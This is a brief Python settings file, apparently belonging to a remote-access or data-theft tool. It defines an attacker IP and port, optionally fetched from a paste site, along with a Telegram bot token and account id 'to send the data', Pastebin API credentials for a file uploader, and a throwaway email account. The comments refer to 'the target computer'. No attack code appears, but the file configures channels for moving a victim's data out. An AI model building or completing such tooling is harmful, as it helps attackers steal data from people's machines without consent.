host=''#your ip ,,,, # you can type as ex host=get('https://pastelocal.com/myip_tool').text ['in the target tool'] if you want to change it on the target computer in the future
port=0#port
token=''#put here your bot token if you want to send the data on telegram and down put your account id 
id=''#your telegram id
api_key=''#username & password & api dev key you can find how to get it here https://pastebin.com/doc_api after you sign up in the website #YOU MUST CHANGE IT because the automatic username&password , someone will change his password or username , and after that File uploder will stop work!!!
api_username=''#auto '''you must change it''' !!!!
api_password=''#auto '''you must change it''' !!!!
email=''#i suggest you to use this tool https://github.com/Filza2/Fake-Email